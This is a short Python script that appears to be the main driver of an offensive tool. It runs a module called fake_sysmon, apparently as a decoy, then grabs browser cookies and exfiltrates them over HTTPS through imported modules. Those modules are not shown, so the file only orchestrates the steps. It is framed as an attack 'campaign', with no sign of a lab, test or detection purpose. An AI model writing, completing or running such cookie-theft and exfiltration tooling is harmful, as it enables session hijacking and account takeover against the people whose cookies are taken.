#!/usr/bin/env python3
from core import exfil_https
from plugins import grab_cookies, fake_sysmon

def run_campaign():
    print("[*] Running fake_sysmon...")
    fake_sysmon.simulate()

    print("[*] Grabbing cookies...")
    cookies = grab_cookies.grab()

    print("[*] Exfiltrating data via HTTPS...")
    exfil_https.exfil_https(cookies.encode())

if __name__ == "__main__":
    run_campaign()
